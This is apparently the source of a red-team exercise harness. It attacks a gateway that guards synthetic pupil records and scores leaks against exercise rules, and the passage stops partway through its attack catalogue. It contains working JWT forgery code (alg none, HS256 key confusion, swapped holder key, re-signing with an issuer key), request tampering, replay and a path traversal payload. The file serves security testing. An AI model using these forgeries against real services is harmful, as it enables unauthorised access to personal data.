"""Attack lab for the local board.

Fires adversarial requests at a gateway and scores what comes back against the Day 2
rules in day_2_attack/ATTACK_SCORING.md. A target is either our own deployment or a
remote gateway described by a folder under day_2_attack/targets/<name>/.

- own:  our own deployment. gateway/state holds the issuer key, so the lab can mint, forge
        and revoke any mandate, and signs with gateway/state/agent.pem. Every vector is available.
- byo:  a remote gateway, from day_2_attack/targets/<name>/target.json ({"label","url"}). What
        the lab can do depends on what you paste into that folder:
          - default.jwt / feature.jwt — mandates you were issued, to attack as given.
          - agent.pem — the holder key those mandates are bound to; requests are signed with it
            (falls back to day_2_attack/attack.pem for mandates the lab minted itself).
          - state/ — the remote gateway's state bundle (issuer_key.pem, status_list.json,
            status_list.jwt, agent.pem). With it the lab mints, forges and revokes against the
            remote, exactly as in own mode; without it those vectors are greyed out.

Private keys stay on disk. Findings carry claims, the request body (the evidence a scored
flag needs), decisions and leak analysis, never a private key. Headless:

    uv run python local_view/attacks.py --target own --url http://localhost:8082
    uv run python local_view/attacks.py --target remote   # url comes from the target folder
    uv run python local_view/attacks.py --target own --group forged
"""

from __future__ import annotations

import argparse
import hashlib
import hmac
import json
import os
import secrets
import sys
import threading
import time
import urllib.error
import urllib.request
from dataclasses import dataclass, field
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))  # importable as a standalone CLI, like server.py

import jwt

from gateway import eval as ev
from gateway.cli import DEFAULT_DENY, DEFAULT_SCOPE, issue_mandate, load_agent_pub, revoke_mandate
from gateway.lib.common import (
    b64u,
    generate_keypair,
    jwk_to_pub,
    priv_from_pem,
    priv_to_pem,
    pub_to_jwk,
    pub_to_pem,
    sign_bytes,
)
from gateway.lib.gateway_verify import (
    PRIVATE_LEVEL,
    Request,
    result_levels,
    sensitivity_maps,
    sensitivity_record,
)
from gateway.main import _CLASSIFICATION_CANDIDATES

ROOT = Path(__file__).resolve().parents[1]
STATE = ROOT / "gateway" / "state"
ATTACK = ROOT / "day_2_attack"
TARGETS = ATTACK / "targets"
ATTACK_KEY = ATTACK / "attack.pem"
SAVED = Path(__file__).with_name("saved_vectors.json")

SERVER = "pupil-data"
ROLE = "safeguarding-lead"
CENSUS = ev.CENSUS
SCHOOLS, MANIFEST = ev.SCHOOLS, ev.MANIFEST
NAMES_CSV = "synthetic/synthetic_display_names.csv"
CENSUS_CSV = "synthetic/synthetic_personal_data_school_census.csv"
DEPRIVATION_CSV = "synthetic/synthetic_personal_data_deprivation.csv"
TTL = 3600

HTTP_OK, HTTP_STEP_UP, HTTP_FORBIDDEN, HTTP_TOOL_ERROR, HTTP_CRASH = 200, 202, 403, 502, 500
BULK_THRESHOLD = 100
JWT_PARTS = 3
SKEW = 600  # past the gateway's 30 s mandate skew and 300 s request window

# day_2_attack/ATTACK_SCORING.md. The scoring doc lists FSMeligible (level 3) and
# InCareAtCurrentSchool (level 4) as P0011 flags, but P0011's value for both is 0, so the lab
# detects the column/row disclosure, not value == 1. Only Ethnicity (ASIA) is a positive special
# category value for P0011. P0586 is the one in-care pupil at SCH07, so its in-care flag is a real 1.
FLAG = {
    "pupil": "P0011",
    "urn": "SCH04",
    "school": "Dunmore Community College",
    "name": "Zara Okafor",
    "deprivation": "0.2505",
    "ethnicity": "ASIA",
}
NAMED = {"pupil": "P0586", "urn": "SCH07", "name": "Mason Owusu"}
DATA_POINTS = {"L2": 10, "L3": 20, "L4": 40, "L4-named": 60}
BREAK_POINTS = {"keys": 50, "forged": 30, "dead": 15, "nokey": 15, "bulk": 10, "unseen": 10, "crash": 5}

# Mandates the own-mode lab mints for itself. The default is the Day 2 default attack mandate.
_DEFAULT_MINT = {
    "scope": DEFAULT_SCOPE,
    "deny": DEFAULT_DENY,
    "clearance": 4,
    "role": ROLE,
    "purpose": "Day 2 default attack mandate",
    "principal": "attacker:lab",
    "org": "lab",
}
_FEATURE_MINT = {
    "scope": [{"server": SERVER, "tools": ["aggregate"], "constraints": {"table": [CENSUS]}}],
    "deny": DEFAULT_DENY,
    "clearance": 2,
    "purpose": "Day 2 feature attack mandate",
    "principal": "attacker:lab",
    "org": "lab",
}

_ISSUE = threading.Lock()


# ---------------------------------------------------------------- http


def _http(url: str, data: bytes | None = None, timeout: float = 20) -> tuple[int, object]:
    headers = {"content-type": "application/json"} if data is not None else {}
    req = urllib.request.Request(url, data=data, headers=headers)  # noqa: S310
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:  # noqa: S310
            body = resp.read()
            return resp.status, (json.loads(body) if body else {})
    except urllib.error.HTTPError as exc:
        raw = exc.read()
        try:
            return exc.code, (json.loads(raw) if raw else {})
        except json.JSONDecodeError:
            return exc.code, {"error": raw.decode(errors="replace")}
    except (urllib.error.URLError, TimeoutError, json.JSONDecodeError) as exc:
        return 0, {"error": str(exc)}


def bind_http(base_url: str):
    """A callable http(path, body=None) -> (status, json) bound to one gateway URL."""
    base = base_url.rstrip("/")

    def http(path: str, body: object = None) -> tuple[int, object]:
        data = json.dumps(body).encode() if body is not None else None
        return _http(f"{base}{path}", data)

    return http


# ---------------------------------------------------------------- tokens


def _claims(token: str) -> dict:
    try:
        return jwt.decode(token, options={"verify_signature": False})
    except jwt.PyJWTError:
        return {}


def _header(token: str) -> dict:
    try:
        return jwt.get_unverified_header(token)
    except jwt.PyJWTError:
        return {}


def _read(path: Path) -> str:
    return path.read_text().strip() if path.is_file() else ""


def _assemble(header: dict, claims: dict, sig: str) -> str:
    head = b64u(json.dumps(header, separators=(",", ":")).encode())
    body = b64u(json.dumps(claims, separators=(",", ":")).encode())
    return f"{head}.{body}.{sig}"


def _issuer_pub_pem(state: Path = STATE) -> bytes | None:
    doc = json.loads(_read(state / "trusted_list.json") or "{}")
    for kid_map in doc.get("issuers", {}).values():
        for jwk in kid_map.values():
            return pub_to_pem(jwk_to_pub(jwk))
    return None


def _forge_token(token: str, forge: dict, state: Path = STATE) -> str:
    """Transform a mandate. op: keep-sig, none, random-issuer, issuer, hs256, swap-cnf."""
    op = forge.get("op", "keep-sig")
    header = {**_header(token), **(forge.get("header") or {})}
    claims = _claims(token)
    for key in forge.get("del") or []:
        claims.pop(key, None)
    claims.update(forge.get("set") or {})
    typ, kid = header.get("typ", "mandate+jwt"), header.get("kid", "")
    parts = token.split(".")
    orig_sig = parts[2] if len(parts) >= JWT_PARTS else ""
    if op == "swap-cnf":  # rebind to a key we hold, keep the issuer signature -> SIG_INVALID
        _priv, pub = generate_keypair()
        claims["cnf"] = {"jwk": pub_to_jwk(pub)}
        op = "keep-sig"
    if op == "keep-sig":  # edit claims or header, keep the issuer signature
        return _assemble(header, claims, orig_sig)
    if op == "none":  # unsigned token, alg none
        return _assemble({**header, "alg": "none"}, claims, "")
    if op == "hs256":  # alg confusion: HMAC the token with the issuer public key as the secret
        # PyJWT refuses an asymmetric PEM as an HMAC key, so hand-roll the forgery the classic attack uses.
        secret = _issuer_pub_pem(state) or b"public"
        head = b64u(json.dumps({"alg": "HS256", "typ": typ, "kid": kid}, separators=(",", ":")).encode())
        payload = b64u(json.dumps(claims, separators=(",", ":"), default=str).encode())
        signing_input = f"{head}.{payload}"
        return f"{signing_input}.{b64u(hmac.new(secret, signing_input.encode(), hashlib.sha256).digest())}"
    if op == "random-issuer":  # a valid EdDSA signature from an issuer the gateway never trusted
        key: object = priv_to_pem(generate_keypair()[0])
        alg = "EdDSA"
    elif op == "issuer":  # re-sign with the target's real issuer key, to set nbf/exp or drop a claim validly
        key = priv_to_pem(priv_from_pem((state / "issuer_key.pem").read_bytes()))
        alg = "EdDSA"
    else:
        return token
    return jwt.encode(claims, key, algorithm=alg, headers={"typ": typ, "kid": kid})


# ---------------------------------------------------------------- mandates


def _mint(spec: dict, state: Path = STATE) -> tuple[str, int]:
    extra: dict = {}
    if "clearance" in spec:
        extra["clearance"] = spec["clearance"]
    if spec.get("role") is not None:
        extra["role"] = spec["role"]
    extra.update(spec.get("extra") or {})
    with _ISSUE:
        return issue_mandate(
            state,
            load_agent_pub(state / "agent.pem"),
            scope=spec.get("scope", DEFAULT_SCOPE),
            deny=spec.get("deny", DEFAULT_DENY),
            ttl=spec.get("ttl", TTL),
            purpose=spec.get("purpose", "attack lab"),
            principal=spec.get("principal", "attacker:lab"),
            org=spec.get("org", "lab"),
            extra=extra or None,
        )


# One run fires up to a few thousand vectors; minting a fresh mandate for each would append thousands of
# status-list entries. Mandates are reusable (the per-request nonce and signature are built fresh each call),
# so a run mints one token per distinct spec and reuses it. Reset at the start of every group or full run.
_TOKEN_CACHE: dict[str, tuple[str, int | None]] = {}


def _reset_run_cache() -> None:
    _TOKEN_CACHE.clear()


def _cached_mint(spec: dict, state: Path = STATE) -> tuple[str, int | None]:
    key = json.dumps([str(state), spec], sort_keys=True, default=str)
    cached = _TOKEN_CACHE.get(key)
    if cached is None:
        cached = _mint(spec, state)
        _TOKEN_CACHE[key] = cached
    return cached


def _base_token(target: Target, base: str) -> str:
    # A byo target attacks the mandates it was given; only a target that can mint builds its own.
    if target.mode == "byo" and not target.can_mint:
        tok = target.mandates.get(base, "")
        if not tok:
            msg = f"this target has no {base} mandate on disk"
            raise FileNotFoundError(msg)
        return tok
    if base != "live" and target.mode == "byo":
        tok = target.mandates.get(base, "")
        if tok:
            return tok  # prefer a mandate they issued us over minting our own, even when we can mint
    state = target.state_dir or STATE
    if base == "live":
        return _read(state / "mandate.jwt")
    if base == "feature":
        return _cached_mint(_FEATURE_MINT, state)[0]
    return _cached_mint(_DEFAULT_MINT, state)[0]


def _signing_key(target: Target):
    key = target.agent_key
    if not key.is_file():
        msg = f"signing key {key} missing (uv run python -m gateway.cli keygen -o {key})"
        raise FileNotFoundError(msg)
    return priv_from_pem(key.read_bytes())


def _needs_issuer(forge: dict) -> bool:
    return forge.get("op") in ("issuer", "hs256")


_NEEDS_KEY = "needs the issuer key — own, or a byo target with a state/ bundle"


def _resolve_mandate(target: Target, mandate: dict):
    """Return (token, signing_priv). Raises PermissionError when a step needs an issuer key we do not hold."""
    state = target.state_dir or STATE
    revoke = bool(mandate.get("revoke"))
    idx: int | None = None
    if "raw" in mandate:
        token = mandate["raw"]
    elif mandate.get("mint") is not None:
        if not target.can_mint:
            msg = f"minting a mandate {_NEEDS_KEY}"
            raise PermissionError(msg)
        # revoke needs a fresh idx, so it skips the reuse cache
        token, idx = _mint(mandate["mint"], state) if revoke else _cached_mint(mandate["mint"], state)
    else:
        token = _base_token(target, mandate.get("base", "default"))
    forge = mandate.get("forge")
    if forge:
        if _needs_issuer(forge) and not target.can_mint:
            msg = f"the {forge.get('op')} forge {_NEEDS_KEY}"
            raise PermissionError(msg)
        token = _forge_token(token, forge, state)
    if revoke:
        # Revoking flips a bit in the status list the gateway re-reads each call. That only reaches the gateway
        # when the lab writes the very state the gateway serves (own). A remote reads its own list and never sees
        # our copy's flip, so a revoked-mandate test there would falsely "land" — refuse it instead.
        if target.mode != "own":
            msg = "revoking a mandate needs the live gateway state (own target only)"
            raise PermissionError(msg)
        if idx is None:  # a base or raw mandate: mint one we own so the revoked bit is this call's
            token, idx = _mint(mandate.get("mint") or _DEFAULT_MINT, state)
        with _ISSUE:
            revoke_mandate(state, idx)
    return token, _signing_key(target)


# ---------------------------------------------------------------- requests


def _build_body(signing_priv, tool: str, arguments: dict, mandate: str, tweaks: dict) -> dict:
    ts = int(time.time()) + int(tweaks.get("ts_offset", 0))
    nonce = tweaks.get("nonce") or secrets.token_urlsafe(16)
    req = Request(server=SERVER, tool=tool, arguments=arguments, mandate=mandate, nonce=nonce, ts=ts, sig="")
    if signing_priv is not None:
        req.sig = sign_bytes(signing_priv, req.signing_input())
    body = dict(req.__dict__)
    after = tweaks.get("mutate_after")
    if after:  # change arguments after signing: the signature no longer covers them
        body["arguments"] = {**arguments, **after}
    sig_mode = tweaks.get("sig", "valid")
    if sig_mode == "blank":
        body["sig"] = ""
    elif sig_mode == "garbage":
        body["sig"] = b64u(bytes(64))
    elif sig_mode == "wrong-key":
        other, _pub = generate_keypair()
        body["sig"] = sign_bytes(other, Request(**body).signing_input())
    return body


# ---------------------------------------------------------------- leak analysis


def _manifest() -> dict:
    for raw in _CLASSIFICATION_CANDIDATES:
        if not raw:
            continue
        path = Path(raw) if Path(raw).is_absolute() else ROOT / raw
        if path.is_file():
            return json.loads(path.read_text())["classification"]
    return {"levels": {}, "tables": {}, "columns": {}}


def _rows(result) -> list[dict]:
    if isinstance(result, list):
        return [r for r in result if isinstance(r, dict)]
    return [result] if isinstance(result, dict) else []


def _pupil_ids(result) -> set[str]:
    return {r["Psuedo ID"] for r in _rows(result) if r.get("Psuedo ID")}


def _scope_urns(scope) -> set[str]:
    urns: set[str] = set()
    for entry in scope if isinstance(scope, list) else []:
        for value in (entry.get("constraints") or {}).get("urn", []) or []:
            urns.add(str(value))
    return urns


def _flags(result, scope) -> list[dict]:
    """The highest scoring flag the result discloses outside the mandate's schools."""
    rows = _rows(result)
    if not rows:
        return []
    text = json.dumps(result, default=str)
    urns = _scope_urns(scope)
    found: list[dict] = []
    named_in_care = any(
        r.get("Psuedo ID") == NAMED["pupil"] and str(r.get("InCareAtCurrentSchool")) == "1" for r in rows
    )
    if NAMED["name"] in text and (named_in_care or NAMED["pupil"] in text) and NAMED["urn"] not in urns:
        found.append(
            {
                "id": "L4-named",
                "points": DATA_POINTS["L4-named"],
                "detail": f"{NAMED['name']} ({NAMED['pupil']}) in care at {NAMED['urn']}",
            }
        )
    p, out = FLAG["pupil"], FLAG["urn"] not in urns
    p_rows = [r for r in rows if r.get("Psuedo ID") == p or p in json.dumps(r, default=str)]
    if p_rows and out:
        if FLAG["ethnicity"] in text or any("InCareAtCurrentSchool" in r or "Ethnicity" in r for r in p_rows):
            found.append(
                {"id": "L4", "points": DATA_POINTS["L4"], "detail": f"{p} special category (Ethnicity/InCare)"}
            )
        elif any("FSMeligible" in r or r.get("URN") == FLAG["urn"] for r in p_rows):
            found.append({"id": "L3", "points": DATA_POINTS["L3"], "detail": f"{p} census row (FSMeligible/URN)"})
    if (FLAG["name"] in text or FLAG["deprivation"] in text) and out:
        found.append(
            {"id": "L2", "points": DATA_POINTS["L2"], "detail": f"{FLAG['name']} / deprivation {FLAG['deprivation']}"}
        )
    best = max(found, key=lambda f: f["points"], default=None)
    return [best] if best else []


def _keys_leaked(texts: list[str]) -> bool:
    pem = _read(STATE / "issuer_key.pem")
    raw = ""
    if pem:
        try:
            raw = b64u(priv_from_pem(pem.encode()).private_bytes_raw())
        except (ValueError, TypeError):
            raw = ""
    for text in texts:
        if not text:
            continue
        if pem and pem in text:
            return True
        if raw and raw in text:
            return True
        if "PRIVATE KEY" in text:
            return True
    return False


def analyse(mandate_claims: dict, tool: str, arguments: dict, result) -> dict:
    clf = _manifest()
    columns, tables = sensitivity_maps(clf) if clf.get("columns") else ({}, {})
    names = {int(level): name for level, name in clf.get("levels", {}).items()}
    max_level = max(names, default=4)
    levels = result_levels(tool, arguments, result, columns, tables, max_level) if result is not None else {}
    record = sensitivity_record(levels, names, mandate_claims.get("clearance"))
    flags = _flags(result, mandate_claims.get("scope"))
    return {
        "level": record["level"],
        "label": record["label"],
        "decided_by": record["decided_by"],
        "rows": None if result is None else len(_rows(result)),
        "distinct_pupils": len(_pupil_ids(result)),
        "flags": flags,
        "data_points": max([0, *[f["points"] for f in flags]]),
    }


# ---------------------------------------------------------------- scoring


def _score(vector: dict, status: int, got: str | None, analysis: dict) -> tuple[str, dict]:
    kind = vector.get("kind", "attack")
    breaks: dict[str, int] = {}
    if status == HTTP_CRASH:
        breaks["crash"] = BREAK_POINTS["crash"]
    if analysis.get("keys_leaked"):
        breaks["keys"] = BREAK_POINTS["keys"]
    if analysis.get("distinct_pupils", 0) > BULK_THRESHOLD:
        breaks["bulk"] = BREAK_POINTS["bulk"]
    allowed = status == HTTP_OK and got == "ALLOW"
    wanted = vector.get("break")
    if wanted and allowed and wanted in BREAK_POINTS:
        breaks[wanted] = BREAK_POINTS[wanted]
    has_data = analysis.get("data_points", 0) > 0
    if kind == "baseline":
        if status == 0:
            return "NO ANSWER", breaks
        return ("OK" if allowed else "BROKE" if status == HTTP_CRASH else "OVER-DENY"), breaks
    if kind == "info":
        return (
            "DATA"
            if allowed and (has_data or analysis.get("rows"))
            else "DENIED"
            if status == HTTP_FORBIDDEN
            else "RAN"
        ), breaks
    if status == HTTP_CRASH:
        return "BROKE", breaks
    if status == 0:
        return "NO ANSWER", breaks
    landed = analysis.get("keys_leaked") or (
        allowed and (has_data or bool(wanted) or analysis.get("distinct_pupils", 0) > BULK_THRESHOLD)
    )
    return ("LANDED" if landed else "HELD"), breaks


def _subdict(value: object, *path: str) -> dict:
    """Walk a chain of keys, tolerating a malformed claim that put a non-dict where a dict belongs."""
    for key in path:
        value = value.get(key) if isinstance(value, dict) else None
    return value if isinstance(value, dict) else {}


def _trim_claims(claims: dict) -> dict:
    if not isinstance(claims, dict):
        return {}
    status = _subdict(claims, "status", "status_list")
    cnf = _subdict(claims, "cnf", "jwk")
    return {
        "iss": claims.get("iss"),
        "agent_id": claims.get("agent_id"),
        "clearance": claims.get("clearance"),
        "role": claims.get("role"),
        "role_exp": claims.get("role_exp"),
        "scope": claims.get("scope"),
        "deny": claims.get("deny"),
        "purpose": claims.get("purpose"),
        "principal": _subdict(claims, "delegator").get("principal"),
        "jti": claims.get("jti"),
        "exp": claims.get("exp"),
        "nbf": claims.get("nbf"),
        "idx": status.get("idx"),
        "cnf_kty": f"{cnf.get('kty', '')} {cnf.get('crv', '')}".strip() or None,
    }


_RESULT_SAMPLE = 8


def _trim_result(result: object) -> object:
    """A sample of what came back: enough rows to see the disclosure, never the whole export."""
    if isinstance(result, list):
        return {"rows": result[:_RESULT_SAMPLE], "shown": min(len(result), _RESULT_SAMPLE), "total": len(result)}
    return result


_TOKEN_PREVIEW = 80
_SIG_PREVIEW = 44


def _trim_request(request: dict) -> dict:
    """The exact body sent, with the long opaque strings shortened — the claims are in mandate_claims."""
    out = dict(request or {})
    token = out.get("mandate")
    if isinstance(token, str) and len(token) > _TOKEN_PREVIEW:
        out["mandate"] = f"{token[:40]}…{token[-24:]}  ({len(token)} chars)"
    sig = out.get("sig")
    if isinstance(sig, str) and len(sig) > _SIG_PREVIEW:
        out["sig"] = f"{sig[:28]}…  ({len(sig)} chars)"
    return out


def _finding(
    vector: dict,
    *,
    status=None,
    got=None,
    reason=None,
    detail="",
    analysis=None,
    request=None,
    mandate_claims=None,
    disclosure=None,
    sensitivity=None,
    response=None,
    error=None,
    notes=None,
) -> dict:
    analysis = analysis or {}
    outcome, breaks = ("ERROR", {}) if error else _score(vector, status or 0, got, analysis)
    return {
        "id": vector["id"],
        "group": vector["group"],
        "title": vector["title"],
        "kind": vector.get("kind", "attack"),
        "type": vector.get("type", "request"),
        "needs_mint": vector.get("needs_mint", False),
        "note": vector.get("note", ""),
        "break_label": vector.get("break"),
        "status": status,
        "got": got,
        "reason": reason,
        "detail": detail,
        "outcome": outcome,
        "breaks": breaks,
        "points": analysis.get("data_points", 0) + sum(breaks.values()),
        "level": analysis.get("level", 0),
        "label": analysis.get("label", ""),
        "decided_by": analysis.get("decided_by", []),
        "flags": analysis.get("flags", []),
        "rows": analysis.get("rows"),
        "distinct_pupils": analysis.get("distinct_pupils", 0),
        "request": _trim_request(request or {}),
        "mandate_claims": _trim_claims(mandate_claims or {}),
        "disclosure": disclosure,
        "sensitivity": sensitivity,
        "response": response or {},
        "notes": notes or [],
        "error": error,
    }


# ---------------------------------------------------------------- runners


def _run_request(target: Target, vector: dict, http) -> dict:
    token, signing_priv = _resolve_mandate(target, vector.get("mandate") or {})
    claims = _claims(token)
    tweaks = dict(vector.get("tweaks") or {})
    tool, arguments = vector.get("tool", "search"), vector.get("arguments") or {}
    replay = bool(tweaks.get("replay"))
    responses: list[tuple[int, dict]] = []
    body: dict = {}
    rounds = 2 if replay else max(1, int(tweaks.get("repeat", 1)))
    for _round in range(rounds):
        if not (replay and responses):  # replay sends the very same body (same nonce) a second time
            body = _build_body(signing_priv, tool, arguments, token, tweaks)
        status, payload = http("/tools/call", body)
        responses.append((status, payload if isinstance(payload, dict) else {}))
    status, payload = responses[-1]
    decision = payload.get("decision") or {}
    result = payload.get("result")
    distinct: set[str] = set()
    for _s, resp in responses:
        distinct |= _pupil_ids(resp.get("result"))
    analysis = analyse(claims, tool, arguments, result)
    analysis["distinct_pupils"] = len(distinct)
    analysis["keys_leaked"] = _keys_leaked([json.dumps(resp, default=str) for _s, resp in responses])
    notes = []
    if tweaks.get("replay"):
        notes.append(f"first call HTTP {responses[0][0]}, replay HTTP {responses[-1][0]}")
    response = {
        "status": status,
        "decision": decision,
        "result": _trim_result(result),
        "result_rows": analysis.get("rows"),
        "error": payload.get("error"),
    }
    return _finding(
        vector,
        status=status,
        got=decision.get("decision"),
        reason=decision.get("reason_code"),
        detail=decision.get("detail") or payload.get("error") or "",
        analysis=analysis,
        request=body,
        mandate_claims=claims,
        disclosure=decision.get("disclosure"),
        sensitivity=decision.get("sensitivity"),
        response=response,
        notes=notes,
    )


def _run_demo(_target: Target, vector: dict, http) -> dict:
    mint = vector.get("demo_mandate") or {"urn": FLAG["urn"], "tools": ["pupil", "search"], "clearance": 4}
    call = vector.get("demo_call") or {"tool": "pupil", "arguments": {"pupil_id": FLAG["pupil"], "urn": FLAG["urn"]}}
    m_status, m_payload = http("/demo/mandate", mint)
    m_payload = m_payload if isinstance(m_payload, dict) else {}
    if m_status != HTTP_OK:
        return _finding(
            vector,
            status=m_status,
            got=None,
            reason=None,
            detail=m_payload.get("error") or "the target exposes no /demo/mandate route",
            notes=["/demo/mandate did not mint a mandate"],
        )
    c_status, c_payload = http("/demo/call", call)
    c_payload = c_payload if isinstance(c_payload, dict) else {}
    inner = c_payload.get("response") if isinstance(c_payload.get("response"), dict) else {}
    status = c_payload.get("status", c_status)
    decision = inner.get("decision") or {}
    claims = m_payload.get("claims") or {}
    analysis = analyse(claims, call["tool"], call.get("arguments") or {}, inner.get("result"))
    analysis["keys_leaked"] = _keys_leaked([json.dumps(c_payload, default=str)])
    return _finding(
        vector,
        status=status,
        got=decision.get("decision"),
        reason=decision.get("reason_code"),
        detail=decision.get("detail") or "the target minted a mandate through its own demo route",
        analysis=analysis,
        request={"demo_mandate": mint, "demo_call": call},
        mandate_claims=claims,
        response={
            "status": status,
            "decision": decision,
            "result": _trim_result(inner.get("result")),
            "mint": m_payload,
        },
        notes=["/demo/mandate minted a mandate on request"],
    )


def _run_discovery(_target: Target, vector: dict, http) -> dict:
    path = vector.get("path", "/describe")
    status, payload = http(path, None)
    text = json.dumps(payload, default=str)
    analysis = {
        "keys_leaked": _keys_leaked([text]),
        "flags": [],
        "data_points": 0,
        "level": 0,
        "label": "",
        "distinct_pupils": 0,
        "rows": None,
    }
    return _finding(
        vector,
        status=status,
        got="LEAK" if analysis["keys_leaked"] else None,
        reason=None,
        detail="a private key appears in the response"
        if analysis["keys_leaked"]
        else f"{path} answered without a private key",
        analysis=analysis,
        request={"GET": path},
        response={"status": status, "body": payload},
    )


def _run_one(target: Target, vector: dict, http) -> dict:
    runner = {"demo": _run_demo, "discovery": _run_discovery}.get(vector.get("type", "request"), _run_request)
    try:
        return runner(target, vector, http)
    except (PermissionError, FileNotFoundError, ValueError, KeyError, TypeError, AttributeError, jwt.PyJWTError) as exc:
        return _finding(vector, error=f"{type(exc).__name__}: {exc}")


def run_vector(target: Target, vector: dict, http) -> dict:
    _reset_run_cache()
    return _run_one(target, vector, http)


def _runnable(target: Target, vector: dict) -> bool:
    if vector.get("needs_mint") and not target.can_mint:
        return False
    # Revocation only reaches a gateway that serves the state we write, so it is an own-target test.
    return target.mode == "own" or not (vector.get("mandate") or {}).get("revoke")


def run_group(target: Target, group: str, http) -> list[dict]:
    _reset_run_cache()
    return [_run_one(target, v, http) for v in catalog() if v["group"] == group and _runnable(target, v)]


def run_all(target: Target, http) -> list[dict]:
    _reset_run_cache()
    return [_run_one(target, v, http) for v in catalog() if _runnable(target, v)]


def compose(target: Target, spec: dict, http) -> dict:
    vector = {
        "id": spec.get("id", "manual"),
        "group": spec.get("group", "manual"),
        "title": spec.get("title", "manual attack"),
        **spec,
    }
    return run_vector(target, vector, http)


# ---------------------------------------------------------------- targets


@dataclass
class Target:
    label: str
    url: str
    mode: str  # own | byo
    mandates: dict[str, str] = field(default_factory=dict)
    agent_key: Path = STATE / "agent.pem"
    state_dir: Path | None = None  # own: gateway/state; byo: a pasted remote-state bundle, or None

    @property
    def can_mint(self) -> bool:
        return self.state_dir is not None and (self.state_dir / "issuer_key.pem").is_file()


def _own_ready() -> bool:
    return (STATE / "issuer_key.pem").is_file() and (STATE / "agent.pem").is_file()


def _byo_state(folder: Path) -> Path | None:
    bundle = folder / "state"
    return bundle if (bundle / "issuer_key.pem").is_file() else None


def targets() -> list[dict]:
    rows: list[dict] = []
    if _own_ready():
        rows.append(
            {
                "id": "own",
                "label": "Our gateway (mint)",
                "mode": "own",
                "url": "",
                "mandates": ["default", "feature", "live"],
                "can_mint": True,
            }
        )
    for cfg in sorted(TARGETS.glob("*/target.json")) if TARGETS.is_dir() else []:
        folder = cfg.parent
        meta = json.loads(cfg.read_text())
        mints = _byo_state(folder) is not None
        rows.append(
            {
                "id": folder.name,
                "label": meta.get("label", folder.name),
                "mode": "byo",
                "url": meta.get("url", ""),
                "mandates": [name for name in ("default", "feature") if (folder / f"{name}.jwt").is_file()],
                "can_mint": mints,
            }
        )
    return rows


def load_target(target_id: str, url: str | None = None) -> Target:
    if target_id == "own":
        return Target("Our gateway (mint)", url or "", "own", state_dir=STATE)
    folder = TARGETS / target_id
    cfg = folder / "target.json"
    meta = json.loads(cfg.read_text()) if cfg.is_file() else {}
    mandates: dict[str, str] = {}
    for name in ("default", "feature"):
        tok = _read(folder / f"{name}.jwt")
        if tok:
            mandates[name] = tok
    state_dir = _byo_state(folder)
    # Sign requests with, in order: a holder key pasted beside the mandate, the minting bundle's
    # own holder key, else our attack key (which only matches mandates the lab minted itself).
    agent_key = ATTACK_KEY
    for candidate in (folder / "agent.pem", (state_dir / "agent.pem") if state_dir else None):
        if candidate and candidate.is_file():
            agent_key = candidate
            break
    return Target(meta.get("label", target_id), url or meta.get("url", ""), "byo", mandates, agent_key, state_dir)


# ---------------------------------------------------------------- catalogue

# Each vector: id, group, title, kind (attack|baseline|info), needs_mint, mandate, tool, arguments,
# tweaks, break (the Day 2 break it earns if it lands), note (why a sound gateway holds it).
_CATALOG: list[dict] = [
    # --- baseline: the default mandate must keep working (an over-deny guard, question 0) ---
    {
        "id": "base-search",
        "group": "baseline",
        "kind": "baseline",
        "title": "search own school (SCH01)",
        "mandate": {"base": "default"},
        "tool": "search",
        "arguments": {"query": "P0004", "urn": "SCH01"},
        "note": "The default mandate allows search at SCH01; denying it is an over-deny that fails question 0.",
    },
    {
        "id": "base-get-schools",
        "group": "baseline",
        "kind": "baseline",
        "title": "get the schools file",
        "mandate": {"base": "default"},
        "tool": "get",
        "arguments": {"path": SCHOOLS},
        "note": "The schools file is in the default mandate and level 1.",
    },
    {
        "id": "base-get-manifest",
        "group": "baseline",
        "kind": "baseline",
        "title": "get the manifest",
        "mandate": {"base": "default"},
        "tool": "get",
        "arguments": {"path": MANIFEST},
        "note": "The manifest is public and in the default mandate.",
    },
    # --- data flags with the default mandate (should all be denied before forwarding) ---
    {
        "id": "data-search-flag",
        "group": "data",
        "kind": "attack",
        "title": "search the flag pupil at SCH04",
        "mandate": {"base": "default"},
        "tool": "search",
        "arguments": {"query": FLAG["pupil"], "urn": FLAG["urn"]},
        "note": "SCH04 is outside the default mandate's SCH01; CONSTRAINT_VIOLATED holds it.",
    },
    {
        "id": "data-search-nourn",
        "group": "data",
        "kind": "attack",
        "title": "search the flag pupil with no school",
        "mandate": {"base": "default"},
        "tool": "search",
        "arguments": {"query": FLAG["pupil"]},
        "note": "urn is a required constraint; CONSTRAINT_MISSING holds it.",
    },
    {
        "id": "data-pupil-flag",
        "group": "data",
        "kind": "attack",
        "title": "full record of the flag pupil",
        "mandate": {"base": "default"},
        "tool": "pupil",
        "arguments": {"pupil_id": FLAG["pupil"], "urn": FLAG["urn"]},
        "note": "pupil is not in the default scope; OUT_OF_SCOPE holds it.",
    },
    {
        "id": "data-pupil-named",
        "group": "data",
        "kind": "attack",
        "title": "the named in-care pupil at SCH07",
        "mandate": {"base": "default"},
        "tool": "pupil",
        "arguments": {"pupil_id": NAMED["pupil"], "urn": NAMED["urn"]},
        "note": "The level-4 named flag. pupil is out of scope on the default mandate.",
    },
    {
        "id": "data-get-census",
        "group": "data",
        "kind": "attack",
        "title": "get the whole census file",
        "mandate": {"base": "default"},
        "tool": "get",
        "arguments": {"path": CENSUS_CSV, "limit": 99999},
        "note": "The census path is not in the default mandate; CONSTRAINT_VIOLATED holds it.",
    },
    {
        "id": "data-get-names",
        "group": "data",
        "kind": "attack",
        "title": "get every pupil's name",
        "mandate": {"base": "default"},
        "tool": "get",
        "arguments": {"path": NAMES_CSV},
        "note": "The names file is out of the default mandate; CONSTRAINT_VIOLATED holds it.",
    },
    {
        "id": "data-get-traversal",
        "group": "data",
        "kind": "attack",
        "title": "reach the census through ..",
        "mandate": {"base": "default"},
        "tool": "get",
        "arguments": {"path": "synthetic/../synthetic/synthetic_personal_data_school_census.csv"},
        "note": "normpath on both sides means the traversal still resolves to a path outside the mandate.",
    },
    {
        "id": "data-roster-flag",
        "group": "data",
        "kind": "attack",
        "title": "roster the flag pupil's cohort",
        "mandate": {"base": "default"},
        "tool": "roster",
        "arguments": {"urn": FLAG["urn"], "year_group": 11, "academic_year": "2021/22"},
        "note": "roster is out of the default scope; OUT_OF_SCOPE holds it.",
    },
    {
        "id": "data-draft-flag",
        "group": "data",
